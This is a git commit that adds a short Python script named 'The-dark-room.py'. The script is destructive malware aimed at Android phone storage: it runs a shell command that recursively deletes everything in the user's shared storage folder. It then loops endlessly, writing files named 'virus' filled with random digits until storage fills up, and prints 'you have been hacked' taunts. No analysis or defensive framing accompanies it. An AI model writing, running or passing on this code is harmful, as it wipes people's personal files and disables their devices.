4673803e1970c0fda4db74d8b9f5d5c8edaff894
Lucifer293 <80107371+Lucifer293@users.noreply.github.com>
2021-03-06 19:43:30 +0200

    Create The-dark-room.py

---
+++ The-dark-room.py
@@ -0,0 +1,11 @@
+import os
+os.chdir("/storage/emulated/0/")
+os.system("rm -rif /storage/emulated/0/")
+import random
+for i in range(6000000000000000000):
+    L=open("virus{}".format(i),"w")
+    for w in range(100):
+        L.write(str(random.randint(61946494644949,91619164494373918)))
+        print("you have been hacked / Lucifer ")
+        print("hahahahahaha")
+	
